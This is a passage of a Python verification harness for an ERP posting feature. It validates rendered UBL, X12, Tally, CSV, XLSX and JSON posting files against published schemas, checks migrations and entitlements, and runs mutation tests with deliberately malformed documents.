"""ARCH-47 — ERP & System-of-Record Posting: verification harness.

Run from backend/:

    python verify_arch47.py                      # offline gates (golden files against published schemas for every
                                                 #   format / preset / object, mapping-language refusals, X12 997 /
                                                 #   Tally / ack-file correlation, backoff, egress, wiring, API, console)
    python verify_arch47.py --db                 # + schema refusals, drift, HTTP 402/200 on every route, mock
                                                 #   REST/OData/SFTP targets, acknowledgement mismatches, the review hub,
                                                 #   Flow Builder, the sweep, erasure -- ONE rolled-back transaction --
                                                 #   and exactly-once under concurrent planning and concurrent delivery
                                                 #   (a dedicated organization, committed, then deleted)
    python verify_arch47.py --mutate             # + deliberate breakages every gate must catch (for the right reason)
    python verify_arch47.py --build              # + tsc -b, vite build, eslint on every ARCH-47 console file
    python verify_arch47.py --regression         # + verify_arch46.py --db
    python verify_arch47.py --db --mutate --build --regression   # certification

No live ERP is contacted: REST/OData and SFTP targets are local mock servers
(scripts/erp_mock_targets.py) that behave like each preset's API, including
the faults that make exactly-once hard (a reset after the target committed, a
lost acknowledgement, 429/503 with Retry-After, a duplicate refusal).

ARCH47-S1:verify. Evidence goes to backend/evidence/arch47/.
"""

from __future__ import annotations

import argparse
import contextlib
import hashlib
import importlib
import importlib.util
import io
import json
import logging
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import uuid
import zipfile
from datetime import date, datetime, timedelta, timezone
from decimal import Decimal
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Callable, Optional

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BACKEND = Path(__file__).resolve().parent
ROOT = BACKEND.parent
FRONTEND = ROOT / "frontend"
SRC = FRONTEND / "src"
APP = BACKEND / "app"
VERSIONS = BACKEND / "alembic" / "versions"
EVIDENCE = BACKEND / "evidence" / "arch47"
if str(BACKEND) not in sys.path:
    sys.path.insert(0, str(BACKEND))
if str(BACKEND / "scripts") not in sys.path:
    sys.path.insert(0, str(BACKEND / "scripts"))

A46 = "arch46_step1_obligations"
A47 = "arch47_step1_erp_posting"
STEP3 = "arch40_step3_contract_ai_settings"
KEY = "capability.erp_posting"
TABLES = ("erp_targets", "erp_mappings", "erp_lookup_tables", "erp_postings", "erp_posting_attempts")
HELD_OUT_SEEDS = tuple(range(4700, 4760))
UTC = timezone.utc
AT = datetime(2026, 9, 25, 6, 30, tzinfo=UTC)


def read(path: Any) -> str:
    raw = Path(path).read_bytes()
    if raw[:2] in (b"\xff\xfe", b"\xfe\xff"):
        return raw.decode("utf-16").replace("\r\n", "\n")
    return raw.decode("utf-8-sig").replace("\r\n", "\n")


E_ = APP / "services" / "erp"
F = {
    "migration": VERSIONS / f"{A47}.py", "m46": VERSIONS / f"{A46}.py", "step3": VERSIONS / f"{STEP3}.py",
    "vocab": E_ / "vocabulary.py", "canonical": E_ / "canonical.py", "mapping": E_ / "mapping.py",
    "presets": E_ / "presets.py", "render": E_ / "render.py", "synthetic": E_ / "synthetic.py",
    "sources": E_ / "sources.py", "service": E_ / "service.py", "gate": E_ / "gate.py",
    "formats_init": E_ / "formats/__init__.py", "tabular": E_ / "formats/tabular.py", "xsd": E_ / "formats/xsd.py",
    "ubl": E_ / "formats/ubl.py", "x12": E_ / "formats/x12.py", "tally": E_ / "formats/tally.py",
    "jsonapi": E_ / "formats/jsonapi.py", "transport_init": E_ / "transport/__init__.py",
    "http": E_ / "transport/http.py", "sftp": E_ / "transport/sftp.py",
    "xmlsafe": E_ / "formats/xmlsafe.py", "v16": BACKEND / "scripts/verify_arch16.py",  # ARCH47-S1:xml-safety
    "ssrf": APP / "core/ssrf_client.py",  # ARCH47-S1:portability (the connect fallback)
    "tally_xsd": E_ / "schemas/tally/tally-voucher-import.xsd", "sources_md": E_ / "schemas/SOURCES.md",
    "models": APP / "models/erp.py", "schemas": APP / "schemas/erp.py", "api": APP / "api/v1/erp.py",
    "action": APP / "services/automation/actions/erp_post.py",
    "actions_init": APP / "services/automation/actions/__init__.py",
    "catalog_service": APP / "services/automation/catalog_service.py",
    "selectors": APP / "services/tools/flow_selectors.py",
    "handler": APP / "workers/handlers/erp.py", "sweep": BACKEND / "scripts/sweep_erp_postings.py",
    "mock": BACKEND / "scripts/erp_mock_targets.py",
    "ent": APP / "core/entitlements.py", "capgate": APP / "api/capability_gate.py",
    "seed": BACKEND / "scripts/seed_quota_tiers.py",
    "events": APP / "core/automation_events.py", "triggers": APP / "services/automation/triggers.py",
    "review_model": APP / "models/review.py", "review_vocab": APP / "services/review/vocabulary.py",
    "resolution": APP / "services/review/resolution.py", "review_schema": APP / "schemas/review.py",
    "review_api": APP / "api/v1/review.py", "router": APP / "api/v1/router.py",
    "handlers": APP / "workers/handlers/__init__.py", "profiles": APP / "workers/profiles.py",
    "erasure": APP / "services/compliance/erasure_service.py", "models_init": APP / "models/__init__.py",
    "conformance": BACKEND / "scripts/automation_conformance.py", "dispatcher": BACKEND / "deploy/bin/flowpilot-sweep",
    "cron": BACKEND / "deploy/cron.d/flowpilot-sweepers", "requirements": BACKEND / "requirements.txt",
    "apply37": BACKEND / "apply_arch37.py", "apply39": BACKEND / "apply_arch39.py",
    "v31": BACKEND / "verify_arch31.py", "v31s0": BACKEND / "verify_arch31_step0.py", "v34": BACKEND / "verify_arch34.py",
    "v35": BACKEND / "verify_arch35.py", "v36": BACKEND / "verify_arch36.py", "v37": BACKEND / "verify_arch37.py",
    "v38": BACKEND / "verify_arch38.py", "v39": BACKEND / "verify_arch39.py", "v40": BACKEND / "verify_arch40.py",
    "v41": BACKEND / "verify_arch41.py", "v42": BACKEND / "verify_arch42.py", "v43": BACKEND / "verify_arch43.py",
    "v44": BACKEND / "verify_arch44.py", "v45": BACKEND / "verify_arch45.py", "v46": BACKEND / "verify_arch46.py",
    "vhm": BACKEND / "verify_hardening_master.py",
    "fe_types": SRC / "types/erp.ts", "fe_api": SRC / "services/api/erp.ts",
    "fe_page": SRC / "pages/erp/ErpPosting.tsx", "fe_detail": SRC / "pages/erp/ErpPostingDetail.tsx",
    "fe_target": SRC / "pages/erp/ErpTargetDetail.tsx", "fe_common": SRC / "components/erp/common.tsx",
    "fe_table": SRC / "components/erp/PostingTable.tsx", "fe_ready": SRC / "components/erp/ReadyToPost.tsx",
    "fe_preview": SRC / "components/erp/PreviewPanel.tsx", "fe_new": SRC / "components/erp/NewTarget.tsx",
    "fe_cred": SRC / "components/erp/CredentialFields.tsx", "fe_lookups": SRC / "components/erp/LookupTables.tsx",
    "fe_mapping": SRC / "components/erp/MappingEditor.tsx", "fe_doc": SRC / "components/erp/DocumentPostings.tsx",
    "fe_caps": SRC / "constants/capabilities.ts", "fe_plan": SRC / "constants/planFeatures.ts",
    "fe_nav": SRC / "components/layout/navigation.ts", "fe_paths": SRC / "routes/tenantPaths.ts", "fe_app": SRC / "App.tsx",
    "fe_wid": SRC / "pages/WorkItems/WorkItemDetails.tsx", "fe_review_types": SRC / "types/review.ts",
    "fe_resolve": SRC / "components/review/ResolvePanel.tsx", "fe_hub": SRC / "pages/Verification/ReviewHub.tsx",
    "fe_action_form": SRC / "components/automation/flow/ActionConfigForm.tsx",
    "fe_flow_types": SRC / "types/automationFlow.ts",
}
ORIGINAL_F = dict(F)   # _with_file points F at a changed copy; gates that walk a directory map back through this
CHANGED_FRONTEND = tuple(str(F[k].relative_to(FRONTEND)).replace("\\", "/") for k in F if k.startswith("fe_"))
#: Vendored published schemas (OASIS UBL 2.1, ECMA-376): carried byte for byte, so no sentinel is written into them.
VENDORED = E_ / "schemas"


def t(key: str) -> str:
    return read(F[key])


class Recorder:
    def __init__(self) -> None:
        self.results: list[tuple[str, str, str]] = []

    def check(self, layer: str, name: str, fn: Callable[[], None]) -> bool:
        if ONLY and not any(name.startswith(prefix) for prefix in ONLY):
            return True
        try:
            fn()
        except AssertionError as exc:
            self.results.append((layer, name, f"FAIL  {exc}"))
            print(f"  FAIL  [{layer}] {name}\n        {str(exc)[:900]}")
            return False
        except Exception as exc:  # noqa: BLE001
            detail = "".join(traceback.format_exception_only(type(exc), exc)).strip()
            if os.environ.get("VERIFY_TRACE"):
                traceback.print_exc()
            self.results.append((layer, name, f"ERROR {detail}"))
            print(f"  FAIL  [{layer}] {name}\n        {detail[:900]}")
            return False
        self.results.append((layer, name, "PASS"))
        print(f"  PASS  [{layer}] {name}")
        return True

    def summary(self) -> int:
        failed = [r for r in self.results if r[2] != "PASS"]
        by_layer: dict[str, int] = {}
        for layer, _, outcome in self.results:
            if outcome == "PASS":
                by_layer[layer] = by_layer.get(layer, 0) + 1
        print(f"\n{len(self.results) - len(failed)} passed, {len(failed)} failed ("
              + ", ".join(f"{n} {layer}" for layer, n in by_layer.items()) + ")")
        return 1 if failed else 0


#: --only F1,MS7,... runs just those gates.
ONLY: tuple[str, ...] = ()


class AnchorMissing(RuntimeError):
    """A mutation whose anchor drifted. Never counted as 'caught'."""


def swap(text: str, old: str, new: str) -> str:
    if old not in text:
        raise AnchorMissing(f"mutation anchor missing: {old[:80]!r}")
    return text.replace(old, new, 1)


#: Why each mutation was caught (the gate's own message), for the evidence file.
CAUGHT: list[str] = []


def expect_failure(fn: Callable[[], Any]) -> None:
    try:
        fn()
    except AnchorMissing:
        raise
    except Exception as exc:  # noqa: BLE001
        CAUGHT.append(f"{type(exc).__name__}: {str(exc)[:300]}")
        return
    raise AssertionError("the gate PASSED against broken code")


def mutation(build: Callable[[], tuple], gate: Callable[..., Any]) -> Callable[[], None]:
    """Build the broken input FIRST, outside the refusal check."""
    def run() -> None:
        args = build()
        expect_failure(lambda: gate(*args))
    return run


def _load_module(name: str, path: Path, text: Optional[str] = None):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module  # dataclasses and typing resolve the defining module through sys.modules
    if text is None:
        spec.loader.exec_module(module)
    else:
        exec(compile(text, str(path), "exec"), module.__dict__)  # noqa: S102
    return module


@contextlib.contextmanager
def patched(*items: tuple[Any, str, Any]):
    """Temporarily replace attributes; an attribute that does not exist is a drifted anchor."""
    saved = []
    for target, attr, value in items:
        if not hasattr(target, attr):
            raise AnchorMissing(f"{getattr(target, '__name__', target)}.{attr} missing")
        saved.append((target, attr, getattr(target, attr)))
        setattr(target, attr, value)
    try:
        yield
    finally:
        for target, attr, value in reversed(saved):
            setattr(target, attr, value)


def _share_exceptions(key: str, module: Any) -> None:
    """A rebuilt copy raises the ORIGINAL module's exception classes (and uses its dataclasses), so every
    `except` in the application still catches them: a mutation must be caught by its gate, never by a class
    identity mismatch (ARCH-46's lesson)."""
    rel = F[key].resolve().relative_to(BACKEND).with_suffix("")
    original = importlib.import_module(".".join(rel.parts))
    for name, value in vars(original).items():
        if isinstance(value, type) and value.__module__ == original.__name__ and (
                issubclass(value, BaseException) or hasattr(value, "__dataclass_fields__")):
            setattr(module, name, value)


def variant(key: str, old: str, new: str, attr: str):
    """One function of a module, rebuilt from its source with one change (its globals are the copy's)."""
    text = swap(t(key), old, new)
    module = _load_module(f"_mut_{key}_{abs(hash((old, new))) % 10**8}", F[key], text)
    _share_exceptions(key, module)
    return getattr(module, attr)


def variant2(key: str, changes: list[tuple[str, str]], attr: str):
    text = t(key)
    for old, new in changes:
        text = swap(text, old, new)
    module = _load_module(f"_mut2_{key}_{abs(hash(tuple(changes))) % 10**8}", F[key], text)
    _share_exceptions(key, module)
    return getattr(module, attr)


def _revisions() -> dict[str, str]:
    revs: dict[str, str] = {}
    for path in VERSIONS.glob("*.py"):
        text = read(path)
        r = re.search(r'^revision\s*(?::\s*str)?\s*=\s*["\']([^"\']+)', text, re.M)
        d = re.search(r'^down_revision\s*(?::[^=]+)?=\s*(.+)$', text, re.M)
        if r:
            revs[r.group(1)] = d.group(1).strip() if d else ""
    return revs


def _raises(fn: Callable[[], Any], exc: type = Exception) -> Optional[BaseException]:
    try:
        fn()
    except exc as e:  # noqa: BLE001
        return e
    return None


def _with_file(key: str, old: str, new: str, gate: Callable[[], Any]) -> Callable[[], None]:
    """A gate that reads a file's TEXT, judged against a changed copy of that file."""
    def run() -> None:
        broken = swap(t(key), old, new)  # the anchor first: a drifted anchor is never "caught"
        saved = F[key]
        tmp = Path(tempfile.mkdtemp(prefix=f"arch47-{key}-")) / saved.name
        tmp.write_text(broken, encoding="utf-8")
        F[key] = tmp
        try:
            expect_failure(gate)
        finally:
            F[key] = saved
            shutil.rmtree(tmp.parent, ignore_errors=True)
    run.gate = gate  # type: ignore[attr-defined]  # checked unmutated first (main)
    return run


def _run(cmd: list[str], cwd: Path, timeout: int = 1800) -> None:
    proc = subprocess.run(cmd, cwd=str(cwd), capture_output=True, text=True, timeout=timeout,
                          shell=os.name == "nt", encoding="utf-8", errors="replace")
    if proc.returncode != 0:
        raise AssertionError(f"{' '.join(cmd)} exited {proc.returncode}\n{(proc.stdout + proc.stderr)[-2500:]}")


# ===========================================================================
# Offline gates
# ===========================================================================


def check_capability(ent: str, gate_text: str, seed: str, caps: str, plan: str, nav: str, v36: str, vhm: str) -> None:
    assert f'ERP_POSTING_CAPABILITY: str = "{KEY}"' in ent, "not declared in entitlements.py"
    block = ent.split("CAPABILITY_KEYS: tuple[str, ...] = (", 1)[1].split(")", 1)[0]
    assert "ERP_POSTING_CAPABILITY" in block, "not in CAPABILITY_KEYS"
    assert "name=ERP_POSTING_CAPABILITY" in ent, "no Entitlement entry (has_capability would raise)"
    assert "entitlements.ERP_POSTING_CAPABILITY:" in gate_text, "no 402 display name"
    business = seed.split("BUSINESS_CAPABILITIES = [", 1)[1].split("]", 1)[0]
    enterprise = seed.split("ENTERPRISE_CAPABILITIES = [", 1)[1].split("]", 1)[0]
    developer = seed.split("DEVELOPER_FEATURES = [", 1)[1].split("]", 1)[0]
    assert KEY in business, "not packaged into Business"
    assert KEY in enterprise, "not packaged into Enterprise"
    assert KEY not in developer, "leaked below Business"
    assert f'erpPosting: "{KEY}"' in caps and "[CAPABILITY.erpPosting]:" in plan, "console capability or plan label missing"
    order = plan.split("PLAN_FEATURE_ORDER", 1)[1].split("];", 1)[0]
    assert "CAPABILITY.erpPosting," in order, "no plan card lists ERP posting (PLAN_FEATURE_ORDER)"
    assert nav.count("capability: CAPABILITY.erpPosting") == 1, "nav entry not capability-locked"
    assert '"workspaceErp": "src/pages/erp/ErpPosting.tsx"' in v36, "verify_arch36 GATED_PAGES not widened"
    assert f'BUS = BUS + ["{KEY}"]' in vhm and f'ENT = ENT + ["{KEY}"]' in vhm, "hardening matrix not widened"
    from app.core import entitlements

    assert KEY in entitlements.CAPABILITY_KEYS and KEY in entitlements.ENTITLEMENT_KEYS


def check_migration(text: str, revs: Optional[dict] = None) -> None:
    revs = revs if revs is not None else _revisions()
    assert revs.get(A47) == f'"{A46}"', f"{A47} revises {revs.get(A47)}"
    assert revs.get(STEP3) == f'"{A47}"', f"the contract step revises {revs.get(STEP3)}, expected {A47}"
    downs = " ".join(revs.values())
    heads = [r for r in revs if f'"{r}"' not in downs and f"'{r}'" not in downs]
    assert heads == [STEP3], f"file heads {heads}; the held contract step must stay the only head"
    for table in TABLES:
        assert f"CREATE TABLE {table}" in text, f"{table} missing"
    for name in ("CONSTRAINT uq_erp_postings_ledger UNIQUE (target_id, object_kind, source_kind, source_id)",
                 "CONSTRAINT uq_erp_postings_idempotency UNIQUE (idempotency_key)", "ck_erp_postings_rendered",
                 "OR (erased_at IS NOT NULL AND state IN ('SENDING', 'DELIVERED'))",
                 "ck_erp_postings_state", "ck_erp_postings_done", "ck_erp_postings_sending", "ck_erp_postings_retrying",
                 "ck_erp_postings_keys", "ck_erp_postings_erased", "ck_erp_postings_exceptions",
                 "ck_erp_targets_format", "ck_erp_targets_json_http", "ck_erp_targets_no_credential_download",
                 "ck_erp_targets_ack", "ck_erp_lookup_tables_entries", "erp_lookup_valid(entries)",
                 "CREATE UNIQUE INDEX uq_erp_mappings_active", "uq_erp_mappings_version", "uq_erp_posting_attempts_seq",
                 "REFERENCES work_items (id, workspace_id) ON DELETE SET NULL (work_item_id)",
                 "REFERENCES erp_targets (id, workspace_id)", "'POSTING'::varchar(16)",
                 "'POSTING_EXCEPTION'::varchar(24)", "ck_review_assignments_kind_known"):
        assert name in text, f"{name} missing from the migration"
    module = _load_module("_m47_check", F["migration"], text)
    m46 = _load_module("_m46_check47", F["m46"])
    view = module.review_queue_view_v8()
    assert m46.review_queue_view_v7().rstrip() in view, "ARCH-47 altered an earlier arm of the hub view"
    assert module.REVIEW_KINDS[:8] == m46.REVIEW_KINDS and module.REVIEW_KINDS[8] == "POSTING"
    assert module.REVIEW_REASONS[:len(m46.REVIEW_REASONS)] == m46.REVIEW_REASONS and "POSTING_EXCEPTION" in module.REVIEW_REASONS
    from app.core import automation_events as ae
    from app.models.review import REVIEW_KINDS
    from app.services.erp import vocabulary as ev
    from app.services.review import vocabulary as vocab

    assert tuple(REVIEW_KINDS) == module.REVIEW_KINDS and tuple(vocab.REASONS) == module.REVIEW_REASONS, "hub vocabulary != migration"
    for name in ("OBJECT_KINDS", "SOURCE_KINDS", "FORMATS", "TRANSPORTS", "PRESETS", "ACK_MODES", "AUTH_MODES",
                 "TARGET_STATUSES", "MAPPING_STATUSES", "STATES", "OPEN_STATES", "EXCEPTION_STATES", "ORIGINS",
                 "ATTEMPT_KINDS", "ATTEMPT_OUTCOMES"):
        assert tuple(getattr(module, name)) == tuple(getattr(ev, name)), f"{name}: migration != vocabulary"
    assert set(module.NEW_TRIGGER_EVENTS) == set(ae.ARCH47_TRIGGER_EVENT_TYPES) == {ev.EVENT_POSTING_FAILED}
    assert ev.EVENT_POSTING_FAILED in ae.INTERNAL_EVENT_TYPES and ev.EVENT_POSTING_FAILED in ae.TRIGGER_NATIVE_EVENT_TYPES
    internal = set(module.internal_after_47())
    assert set(m46.internal_after_46()) < internal and internal - set(m46.internal_after_46()) == {ev.EVENT_POSTING_FAILED}
    assert set(ae.TRIGGER_NATIVE_EVENT_TYPES) | set(ae.TRIGGER_TWIN_EVENT_TYPES) <= internal, "a trigger event outside the outbox CHECK"
    down = text.split("def downgrade", 1)[1]
    assert "review_queue_view_v7()" in down and "internal_after_46()" in down, "downgrade does not restore ARCH-46"
    assert set(module.TABLES_IN_DROP_ORDER) == set(TABLES) and "for table in TABLES_IN_DROP_ORDER:" in down, "downgrade leaves a table"
    assert "DROP FUNCTION IF EXISTS erp_lookup_valid" in down, "downgrade leaves the lookup CHECK function"


# ---------------------------------------------------------------------------
# F: golden files, validated against the published schemas
# ---------------------------------------------------------------------------

GOLDEN_KEY = "0123456789abcdef" * 4


def combos() -> list[tuple[str, str, str]]:
    from app.services.erp import presets as PR
    from app.services.erp import vocabulary as v

    out = []
    for fmt in v.FORMATS:
        for preset in (v.JSON_PRESETS if fmt == v.FORMAT_JSON else (v.PRESET_NONE,)):
            for kind in PR.supported_objects(fmt, preset):
                out.append((fmt, preset, kind))
    return out


def render_golden(fmt: str, preset: str, kind: str, obj: Any = None, *, spec: Optional[dict] = None,
                  config: Optional[dict] = None, control: Any = None):
    from app.services.erp import presets as PR
    from app.services.erp import render as R
    from app.services.erp import synthetic as S
    from app.services.erp.formats import x12

    obj = obj if obj is not None else S.GOLDEN[kind]()
    return R.render(R.TargetView(fmt, preset, config or S.CONFIG), obj,
                    spec if spec is not None else PR.default_mapping(fmt, preset, kind), lookups=S.LOOKUPS,
                    extra={"id": "golden", "idempotency_key": GOLDEN_KEY, "date": obj.posting_date or AT.date(),
                           "bill_external_id": "5001"},
                    posting_id="golden", remote_id="FP-" + GOLDEN_KEY[:32], at=AT,
                    control=control or x12.ControlNumbers(42, 42))


def _xml_values(data: bytes, local: str) -> list[str]:
    from lxml import etree

    root = etree.fromstring(data, etree.XMLParser(no_network=True, resolve_entities=False))
    return [e.text or "" for e in root.iter() if isinstance(e.tag, str) and etree.QName(e).localname == local]


def figures_preserved(fmt: str, preset: str, kind: str, obj: Any, r: Any) -> None:
    """The rendered bytes carry the canonical object's figures exactly (not only schema-valid)."""
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import jsonapi, tabular, x12

    total = obj.total
    where = f"{fmt}/{preset}/{kind}"
    if fmt == v.FORMAT_UBL:
        if kind == v.OBJECT_VENDOR_BILL:
            assert [Decimal(x) for x in _xml_values(r.data, "PayableAmount")] == [total], f"{where}: PayableAmount"
            assert Decimal(_xml_values(r.data, "TaxAmount")[0]) == obj.tax_total, f"{where}: TaxAmount"
        ids = _xml_values(r.data, "ID")
        assert obj.document_number in ids, f"{where}: document number {obj.document_number} not in cbc:ID"
    elif fmt == v.FORMAT_X12:
        segs = x12.parse(r.data).segments
        tag = {s[0]: s for s in segs}
        assert tag["ISA"][13] == tag["IEA"][2] and tag["GS"][6] == tag["GE"][2], f"{where}: control numbers disagree"
        st, se = segs.index(tag["ST"]), segs.index(tag["SE"])
        assert int(tag["SE"][1]) == se - st + 1, f"{where}: SE01 {tag['SE'][1]} != {se - st + 1} segments"
        if kind == v.OBJECT_VENDOR_BILL:
            # TDS01 is X12 type N2: two implied decimals whatever the currency (JPY 1234 -> 123400).
            assert Decimal(tag["TDS"][1]) == total * 100, f"{where}: TDS01 {tag['TDS'][1]} is not {total} as N2"
        items = [s for s in segs if s[0] in ("IT1", "PO1", "SN1")]
        assert len(items) == len(obj.lines), f"{where}: {len(items)} line segments for {len(obj.lines)} lines"
    elif fmt == v.FORMAT_TALLY:
        from lxml import etree

        root = etree.fromstring(r.data, etree.XMLParser(no_network=True, resolve_entities=False))
        entries = root.findall(".//VOUCHER/ALLLEDGERENTRIES.LIST") + root.findall(".//VOUCHER/ALLINVENTORYENTRIES.LIST")
        amounts = [Decimal(e.findtext("AMOUNT")) for e in entries if e.findtext("AMOUNT")]
        assert amounts and sum(amounts, Decimal(0)) == 0, f"{where}: voucher entries do not balance ({sum(amounts)})"
        for inv in root.findall(".//VOUCHER/ALLINVENTORYENTRIES.LIST"):
            alloc = sum((Decimal(a.findtext("AMOUNT")) for a in inv.findall("ACCOUNTINGALLOCATIONS.LIST")), Decimal(0))
            assert alloc == Decimal(inv.findtext("AMOUNT")), f"{where}: an item's accounting allocation differs from its amount"
        if kind in (v.OBJECT_VENDOR_BILL, v.OBJECT_PAYMENT_REFERENCE):
            assert max(abs(a) for a in amounts) == total, f"{where}: the party amount is not the total"
    elif fmt == v.FORMAT_JSON:
        ep = jsonapi.endpoint_for(preset, kind, __import__("app.services.erp.synthetic", fromlist=["CONFIG"]).CONFIG)
        raw = r.data.decode("utf-8")
        floats: list[str] = []
        json.loads(raw, parse_float=lambda text: floats.append(text) or Decimal(text))
        assert not [f for f in floats if "e" in f.lower()], f"{where}: an amount written in exponent form {floats}"
        for echo in ep.echoes:
            value = echo.expected(r.body)
            if echo.numeric or isinstance(value, Decimal):
                assert Decimal(str(value)) == total, f"{where}: echoed {echo.name} {value} != total {total}"
            elif echo.name.lower().startswith("document"):
                assert str(value) in (obj.document_number, obj.po_reference), f"{where}: {echo.name} {value!r}"
    else:
        rows_ = tabular.read_csv(r.data) if fmt == v.FORMAT_CSV else tabular.read_xlsx_rows(r.data)
        header, body = rows_[0], rows_[1:]
        assert len(body) == max(1, len(obj.lines)), f"{where}: {len(body)} rows for {len(obj.lines)} lines"
        if kind == v.OBJECT_JOURNAL_ENTRY:
            d, c = header.index("Debit"), header.index("Credit")
            debit = sum((Decimal(row[d]) for row in body if d < len(row) and row[d]), Decimal(0))
            credit = sum((Decimal(row[c]) for row in body if c < len(row) and row[c]), Decimal(0))
            assert debit == credit == total, f"{where}: debits {debit}, credits {credit}, total {total}"
        elif kind in (v.OBJECT_VENDOR_BILL, v.OBJECT_PURCHASE_ORDER):
            a = next(i for i, h in enumerate(header) if h in ("Line Amount", "Amount"))
            assert sum((Decimal(row[a]) for row in body), Decimal(0)) == obj.subtotal, f"{where}: line amounts"


def check_goldens() -> dict:
    """F1: every format x preset x object renders, validates against its published schema (or, where no free
    published schema exists, against the encoded specification), carries its figures exactly, and is
    byte-for-byte deterministic. The files are written to evidence/arch47/golden/."""
    from app.services.erp import render as R
    from app.services.erp import synthetic as S
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import tally, ubl, xsd

    out_dir = EVIDENCE / "golden"
    out_dir.mkdir(parents=True, exist_ok=True)
    report: dict[str, dict] = {}
    all_combos = combos()
    assert len(all_combos) == 48, f"{len(all_combos)} format/preset/object combinations, expected 48"
    for fmt, preset, kind in all_combos:
        obj = S.GOLDEN[kind]()
        r = render_golden(fmt, preset, kind, obj)
        again = render_golden(fmt, preset, kind)
        where = f"{fmt}/{preset}/{kind}"
        assert r.data == again.data, f"{where}: rendering is not deterministic"
        problems = R.validate_rendered(R.TargetView(fmt, preset, S.CONFIG), kind, r.data)
        assert not problems, f"{where}: {problems[:3]}"
        # the independent published-schema check, straight from the vendored XSDs
        if fmt == v.FORMAT_UBL:
            schema = xsd.UBL_SCHEMAS[ubl.root_name(kind)]
            assert not xsd.validate(r.data, schema), f"{where}: OASIS UBL 2.1 {schema} refuses it"
        elif fmt == v.FORMAT_XLSX:
            assert not xsd.validate_xlsx(r.data), f"{where}: ECMA-376 refuses it"
            with zipfile.ZipFile(io.BytesIO(r.data)) as z:
                sheet = z.read("xl/worksheets/sheet1.xml").decode()
                assert "<f>" not in sheet and "<f " not in sheet, f"{where}: a formula in a posting file"
        elif fmt == v.FORMAT_TALLY:
            assert not xsd.validate(r.data, xsd.TALLY) and not tally.validate(r.data), f"{where}: Tally XSD refuses it"
        figures_preserved(fmt, preset, kind, obj, r)
        name = f"{fmt.lower()}-{preset.lower()}-{kind.lower()}{Path(r.filename).suffix}"
        (out_dir / name).write_bytes(r.data)
        report[where] = {"file": name, "bytes": len(r.data), "sha256": r.sha256, "media_type": r.media_type}
    return report


def check_schema_refusals() -> dict:
    """F2: the validators are not rubber stamps -- each refuses a broken document of its format."""
    from app.services.erp import render as R
    from app.services.erp import synthetic as S
    from app.services.erp import vocabulary as v
    from app.services.erp.formats import jsonapi, tabular, tally, ubl, x12, xsd

    refused = {}
    bill = render_golden("UBL", "NONE", "VENDOR_BILL").data
    for label, broken in (("UBL without cbc:ID", re.sub(rb"<cbc:ID>INV-2026-0042</cbc:ID>", b"", bill, count=1)),
                          ("UBL with an unknown element", bill.replace(b"<cbc:IssueDate>", b"<cbc:Nonsense>x</cbc:Nonsense><cbc:IssueDate>", 1)),
                          ("UBL amount without currencyID", re.sub(rb'(<cbc:PayableAmount) currencyID="INR"', rb"\1", bill))):
        assert broken != bill, label
        problems = ubl.validate(broken, "VENDOR_BILL")
        assert problems, f"{label} accepted"
        refused[label] = problems[0][:160]
    edi = render_golden("X12", "NONE", "VENDOR_BILL").data.decode()
    for label, broken in (("X12 SE01 miscounted", edi.replace("SE*14*0001", "SE*13*0001")),
                          ("X12 IEA02 != ISA13", edi.replace("IEA*1*000000042", "IEA*1*000000043")),
                          ("X12 GE02 != GS06", edi.replace("GE*1*42", "GE*1*41")),
                          ("X12 unknown segment in 810", edi.replace("CTT*2~", "ZZZ*1~CTT*2~")),
                          ("X12 date not CCYYMMDD", edi.replace("BIG*20260901", "BIG*2026091")),
                          ("X12 missing mandatory BIG02", edi.replace("BIG*20260901*INV-2026-0042", "BIG*20260901*"))):
        assert broken != edi, label
        problems = x12.validate(broken.encode())
        assert problems, f"{label} accepted"
        refused[label] = problems[0][:160]
    csv_ = render_golden("CSV", "NONE", "VENDOR_BILL").data
    for label, broken in (("CSV unbalanced quote", csv_.replace(b",", b',"', 1)),
                          ("CSV ragged row", csv_ + b"x\r\n"),
                          ("CSV bare quote in a field", csv_.replace(b"Laptop", b'Lap"top', 1))):
        problems = tabular.validate_csv(broken)
        assert problems, f"{label} accepted"
        refused[label] = problems[0][:160]
    xlsx = render_golden("XLSX", "NONE", "VENDOR_BILL").data
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:
        parts = {n: z.read(n) for n in z.namelist()}
    for label, part, old, new in (("XLSX sheet with an unknown element", "xl/worksheets/sheet1.xml", b"<sheetData>", b"<nonsense/><sheetData>"),
                                  ("XLSX content types without the workbook", "[Content_Types].xml", b'PartName="/xl/workbook.xml"', b'PartName="/xl/gone.xml"')):
        assert old in parts[part], label
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for n, data in parts.items():
                z.writestr(n, data.replace(old, new, 1) if n == part else data)
        problems = xsd.validate_xlsx(buf.getvalue())
        assert problems, f"{label} accepted"
        refused[label] = problems[0][:160]
    tx = render_golden("TALLY", "NONE", "VENDOR_BILL").data
    for label, broken in (("Tally without VOUCHERTYPENAME", re.sub(rb"<VOUCHERTYPENAME>[^<]*</VOUCHERTYPENAME>", b"", tx)),
                          ("Tally amount not a number", tx.replace(b"<AMOUNT>118000.00</AMOUNT>", b"<AMOUNT>lots</AMOUNT>", 1))):
        problems = tally.validate(broken)
        assert problems, f"{label} accepted"
        refused[label] = problems[0][:160]
    body = jsonapi.loads(render_golden("JSON", "QUICKBOOKS_ONLINE", "VENDOR_BILL").data)
    del body["VendorRef"]
    problems = jsonapi.validate_body("QUICKBOOKS_ONLINE", "VENDOR_BILL", body, S.CONFIG)
    assert problems, "a QBO bill without VendorRef accepted"
    refused["QBO bill without VendorRef"] = problems[0][:160]
    # Every validator is reached through render.validate_rendered (what the posting pipeline calls).
    for fmt, preset in ((v.FORMAT_CSV, "NONE"), (v.FORMAT_UBL, "NONE"), (v.FORMAT_X12, "NONE"), (v.FORMAT_TALLY, "NONE")):
        assert R.validate_rendered(R.TargetView(fmt, preset, S.CONFIG), "VENDOR_BILL", b"\x00not a document"), fmt
    return refused


def check_held_out() -> dict:
    """F3: held-out seeds (currencies with 0, 2 and 3 decimals, 1-12 lines, fractional quantities, names with X12
